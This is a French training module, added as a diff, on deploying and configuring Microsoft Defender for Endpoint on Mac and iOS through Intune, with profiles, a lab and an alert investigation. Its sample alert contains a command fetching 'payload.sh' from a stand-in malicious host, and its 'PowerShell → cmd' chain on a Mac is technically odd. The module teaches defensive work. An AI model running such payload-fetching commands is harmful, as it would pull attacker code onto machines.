@@ -1,0 +1,413 @@
+---
+title: "Microsoft Defender for Endpoint sur Mac et iOS"
+description: "Déployer et configurer Microsoft Defender for Endpoint sur macOS et iOS via Intune pour la détection de menaces avancées."
+module: "microsoft-intune-apple"
+level: "avancé"
+duration: "90 min"
+prerequisites: ["gestion-macos-intune", "compliance-policies-intune-apple"]
+tags: ["Defender", "EDR", "macOS", "iOS", "Sécurité", "MDE"]
+---
+
+## Introduction
+
+Microsoft Defender for Endpoint (MDE) est la solution EDR (Endpoint Detection and Response) de Microsoft. Contrairement à un antivirus traditionnel, MDE offre :
+
+- Détection comportementale des menaces avancées (APT, ransomware, fileless malware)
+- Analyse des événements de sécurité en temps réel
+- Investigation et réponse aux incidents
+- Intégration native avec Microsoft 365 Defender et Sentinel
+
+Sur Mac, MDE fonctionne en arrière-plan avec des agents légers. Sur iOS, il agit principalement comme un filtre web et un détecteur de phishing.
+
+---
+
+## Objectifs pédagogiques
+
+À la fin de ce cours, vous serez capable de :
+- Comprendre l'architecture MDE sur macOS et iOS
+- Déployer MDE via Intune avec les profils de configuration appropriés
+- Configurer les permissions système nécessaires (Full Disk Access, Extensions réseau)
+- Lire et interpréter les alertes MDE dans le portail Microsoft 365 Defender
+- Intégrer le score de risque MDE dans les politiques de conformité Intune
+
+---
+
+## Contexte professionnel
+
+Un DSI vous demande de déployer une solution EDR sur tous les Mac de l'entreprise en réponse à une attaque de type ransomware subie par un concurrent. MDE est déjà licencié via Microsoft 365 E5. Votre mission : déploiement silencieux via Intune sur 300 Mac, sans interruption de service.
+
+---
+
+## Notions clés
+
+### Architecture MDE sur macOS
+
+```
+Mac de l'utilisateur
+├── wdavdaemon (daemon principal, protection temps réel)
+├── wdavdaemon_enterprise (scan antimalware)
+├── wdavdaemon_unprivileged (traitement des événements)
+└── mdatp (CLI de management)
+
+Communication :
+  Mac → *.endpoint.security.microsoft.com (HTTPS/443)
+  Mac → *.blob.core.windows.net (mises à jour signatures)
+```
+
+### Permissions requises sur macOS
+
+MDE nécessite plusieurs permissions système qui **ne peuvent pas être accordées manuellement** à grande échelle — il faut les déployer via MDM :
+
+| Permission | Description | Méthode |
+|------------|-------------|---------|
+| Full Disk Access | Accès à tous les fichiers pour scan | Profil PPPC MDM |
+| Extension système | Driver réseau pour protection web | Profil System Extension |
+| Extension réseau | Filtrage réseau (Network Filter) | Profil Content Filter |
+| Notifications | Afficher les alertes à l'utilisateur | Profil Notifications |
+
+---
+
+## Procédure : Déploiement MDE via Intune
+
+### Étape 1 — Licences et pré-requis
+
+Vérifier les licences dans le portail M365 :
+- Microsoft 365 E5 ✅ (inclut MDE Plan 2)
+- Microsoft Defender for Endpoint Plan 2 ✅
+- Ou Microsoft 365 Business Premium (MDE Plan 1)
+
+**Activer Intune comme autorité MDM de MDE :**
+1. https://security.microsoft.com → Settings → Endpoints → Advanced features
+2. **Microsoft Intune connection : On**
+3. Sauvegarder
+
+### Étape 2 — Configurer le profil System Extensions
+
+Dans Intune → Devices → Configuration profiles → + Create → macOS :
+
+```
+Type : Templates → Extensions
+Nom : MDE-macOS-System-Extensions
+
+System extensions :
+  Allowed system extensions :
+    Team ID : UBF8T346G9
+    Bundle identifiers :
+      com.microsoft.wdav.epsext
+      com.microsoft.wdav.netext
+```
+
+### Étape 3 — Configurer Full Disk Access (PPPC)
+
+```
+Type : Templates → Privacy preferences policy control
+Nom : MDE-macOS-Privacy-Preferences
+
+PPPC entries :
+  1. Identifier : com.microsoft.wdav
+     Identifier type : Bundle ID
+     Code requirement : identifier "com.microsoft.wdav" and anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = UBF8T346G9
+     Static code validation : false
+     Accessibility : NotAllowed
+     Address book : NotAllowed
+     Calendar : NotAllowed
+     Camera : NotAllowed
+     File provider presence : NotAllowed
+     Listen event : NotAllowed
+     Media library : NotAllowed
+     Microphone : NotAllowed
+     Photos : NotAllowed
+     Post event : NotAllowed
+     Reminders : NotAllowed
+     Screen capture : NotAllowed
+     Speech recognition : NotAllowed
+     System policy all files : Allow    ← CRITIQUE
+     System policy desktop folder : Allow
+     System policy documents folder : Allow
+     System policy downloads folder : Allow
+     System policy network volumes : Allow
+     System policy removable volumes : Allow
+```
+
+### Étape 4 — Profil de configuration réseau (Content Filter)
+
+```
+Type : Custom (fichier XML)
+Nom : MDE-macOS-Network-Filter
+
+Payload XML :
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>PayloadContent</key>
+  <array>
+    <dict>
+      <key>PayloadType</key>
+      <string>com.apple.webcontent-filter</string>
+      <key>PayloadIdentifier</key>
+      <string>com.microsoft.wdav.netext</string>
+      <key>PayloadUUID</key>
+      <string>GENERATE-A-UUID-HERE</string>
+      <key>FilterType</key>
+      <string>Plugin</string>
+      <key>UserDefinedName</key>
+      <string>Microsoft Defender Network Extension</string>
+      <key>PluginBundleID</key>
+      <string>com.microsoft.wdav</string>
+      <key>FilterSockets</key>
+      <true/>
+      <key>FilterDataProviderBundleIdentifier</key>
+      <string>com.microsoft.wdav.netext</string>
+      <key>FilterDataProviderDesignatedRequirement</key>
+      <string>identifier "com.microsoft.wdav.netext" and anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = UBF8T346G9</string>
+    </dict>
+  </array>
+</dict>
+</plist>
+```
+
+### Étape 5 — Déployer l'application MDE
+
+1. Intune → Apps → macOS → + Add
+2. Type : **macOS app (DMG)**
+3. Télécharger le package MDE depuis :
+   https://aka.ms/mdatpmacosstpkg
+4. Ou utiliser **Microsoft Defender** depuis le Mac App Store (App Store deployment)
+
+**Informations du package :**
+- Nom : `Microsoft Defender`
+- Éditeur : `Microsoft Corporation`
+- Bundle ID : `com.microsoft.wdav`
+- Version minimale macOS : `11.0`
+
+5. Assignment : **Required** → groupe Mac gérés
+
+### Étape 6 — Profil de configuration MDE
+
+Pour configurer silencieusement MDE (pas de pop-ups utilisateur) :
+
+```
+Type : Custom
+Nom : MDE-macOS-Configuration
+
+Payload (com.microsoft.wdav) :
+{
+  "antivirusEngine": {
+    "enableRealTimeProtection": true,
+    "passiveMode": false,
+    "exclusionsMergePolicy": "merge",
+    "scanAfterDefinitionUpdate": true,
+    "scanArchives": true,
+    "maximumOnDemandScanThreads": 2
+  },
+  "cloudService": {
+    "enabled": true,
+    "automaticSampleSubmission": true,
+    "automaticDefinitionUpdateEnabled": true
+  },
+  "edr": {
+    "tags": [
+      {
+        "key": "GROUP",
+        "value": "Mac-Enterprise"
+      }
+    ]
+  },
+  "userInterface": {
+    "hideStatusMenuIcon": false,
+    "userInitiatedFeedback": "enabled"
+  }
+}
+```
+
+---
+
+## Déploiement MDE sur iOS
+
+Sur iOS, MDE fonctionne différemment : pas d'accès kernel, focus sur la protection web et le phishing.
+
+**Fonctionnalités iOS :**
+- Protection web (filtrage URLs malveillantes)
+- Détection de phishing dans Safari, Outlook, Chrome
+- Détection de configuration iOS non sécurisée (jailbreak, version ancienne)
+- VPN système pour le filtrage (transparent pour l'utilisateur)
+
+**Déploiement :**
+1. Intune → Apps → iOS/iPadOS → + Add
+2. Rechercher **Microsoft Defender: Security** dans l'App Store
+3. Type : iOS Store App
+4. Assignment : Required → groupe iOS gérés
+
+**Profil de configuration iOS MDE :**
+```
+Type : VPN
+Nom : MDE-iOS-WebProtection
+
+VPN type : Custom VPN
+Connection name : Microsoft Defender
+VPN server address : 127.0.0.1
+Custom VPN type : com.microsoft.scmx
+```
+
+---
+
+## Exemple concret : Investigation d'une alerte
+
+Un Mac dans votre parc génère une alerte MDE. Voici comment investiguer.
+
+**1. Voir l'alerte dans le portail**
+
+https://security.microsoft.com → Incidents & alerts → Alerts
+
+```
+Alerte : "Suspicious PowerShell execution"
+Severity : High
+Machine : MACBOOK-PRO-JEAN-DUPONT
+Time : 14:32:18
+Process : PowerShell → cmd → curl http://malicious-site.com/payload.sh
+```
+
+**2. Isoler l'appareil (si critique)**
+```
+Dans l'alerte → Actions → Isolate device
+→ Le Mac ne peut plus communiquer sauf avec MDE
+```
+
+**3. Collecter les preuves**
+```
+Actions → Collect investigation package
+→ MDE télécharge les logs, fichiers suspects, artefacts
+→ Accessible sous : Response → Investigation packages
+```
+
+**4. Lancer un scan complet**
+```
+Via Intune : Devices → [Mac] → ... → Scan
+Ou via CLI sur le Mac :
+  mdatp scan quick
+  mdatp scan full
+```
+
+**5. Vérifier la timeline**
+```
+Dans la page de l'appareil → Timeline
+→ Voir tous les processus, connexions réseau, fichiers créés dans les 48h
+→ Identifier le vecteur d'entrée (email ? site web ? USB ?)
+```
+
+---
+
+## Intégration Conformité Intune
+
+Le score de risque MDE peut être utilisé comme condition dans les politiques de conformité Intune :
+
+**Dans la politique de conformité macOS :**
+```
+Device Health → 
+  Require the device to be at or under the Device Threat Level :
+    [ ] Secured   (aucune menace)
+    [x] Low       (menaces basses acceptées)
+    [ ] Medium
+    [ ] High
+```
+
+Ainsi, un Mac avec une alerte "High" de MDE sera automatiquement marqué **non conforme** par Intune → accès conditionnel le bloque → l'utilisateur perd l'accès Microsoft 365 jusqu'à résolution.
+
+---
+
+## Bonnes pratiques
+
+**1. Déployer les profils AVANT l'application**
+Les profils System Extension, PPPC et Network Filter doivent être présents sur le Mac AVANT que MDE s'installe, sinon l'utilisateur voit des pop-ups de permission.
+
+**2. Tester le déploiement silencieux sur 5 machines**
+Vérifier qu'aucun pop-up n'apparaît sur les machines de test avant le déploiement en masse.
+
+**3. Vérifier l'état MDE via CLI**
+```bash
+# Sur le Mac, via Terminal ou SSH
+mdatp health
+# Résultat attendu :
+# healthy : true
+# licensed : true
+# real_time_protection_enabled : true
+# cloud_enabled : true
+```
+
+**4. Monitorer les faux positifs**
+Les premières semaines, surveiller les alertes pour identifier les faux positifs (outils IT légitimes signalés comme suspects). Créer des exclusions via le portail Defender.
+
+---
+
+## Erreurs fréquentes
+
+**Erreur 1 : Full Disk Access pop-up**
+- Cause : Profil PPPC non déployé ou mal configuré avant installation MDE
+- Fix : Supprimer MDE, déployer le profil PPPC, réinstaller MDE
+
+**Erreur 2 : wdavdaemon utilise trop de CPU**
+- Cause : Scan de répertoires avec beaucoup de fichiers (logs, builds)
+- Fix : Ajouter des exclusions dans le profil MDE :
+```json
+"exclusions": [
+  {"$type": "excludedPath", "isDirectory": true, "path": "/var/log"},
+  {"$type": "excludedPath", "isDirectory": true, "path": "/Users/*/Library/Developer"}
+]
+```
+
+**Erreur 3 : MDE non connecté au tenant (Unlicensed)**
+- Cause : Connexion Intune-MDE non activée dans le portail Defender
+- Fix : security.microsoft.com → Settings → Intune connection : On
+
+---
+
+## Mini-lab pratique
+
+```
+Objectif : Déployer MDE sur un Mac de test et vérifier le bon fonctionnement
+
+1. Vérifier les licences MDE dans admin.microsoft.com
+
+2. Activer la connexion Intune-MDE :
+   security.microsoft.com → Settings → Endpoints → 
+   Advanced features → Microsoft Intune connection → On
+
+3. Créer et assigner le profil System Extensions sur votre Mac de test
+
+4. Installer MDE manuellement (test) :
+   Télécharger depuis aka.ms/mdatpmacosstpkg
+   Installer le pkg
+   → Vérifier que les extensions système s'activent automatiquement
+     (System Settings → Privacy & Security → Security)
+
+5. Vérifier l'état :
+   Terminal → mdatp health
+   → Vérifier healthy: true, licensed: true
+
+6. Simuler une détection :
+   curl -o /tmp/eicar.com https://secure.eicar.org/eicar.com
+   → MDE doit détecter et supprimer le fichier EICAR (test antivirus)
+   → Une alerte doit apparaître dans security.microsoft.com
+
+7. Vérifier l'alerte dans le portail :
+   security.microsoft.com → Incidents & alerts → Alerts
+   → Confirmer la présence de l'alerte EICAR
+```
+
+---
+
+## Résumé
+
+| Composant | Détail |
+|-----------|--------|
+| MDE macOS | Agent complet (EDR, AV, protection web) |
+| MDE iOS | Protection web + détection phishing + VPN transparent |
+| Prérequis macOS | Profils System Extension + PPPC + Network Filter |
+| Déploiement | Via Intune (profils + app) |
+| Ordre déploiement | Profils → App (jamais l'inverse) |
+| Intégration conformité | Score risque MDE → Intune → Accès conditionnel |
+| CLI de vérification | `mdatp health` sur le Mac |
+| Portail admin | security.microsoft.com |
+
+MDE sur Apple transforme vos Mac et iPhone en capteurs de sécurité connectés au SOC. Combiné à la conformité Intune et à l'accès conditionnel, il crée une chaîne de sécurité complète : détection sur l'appareil → signal dans Intune → décision dans Entra ID.
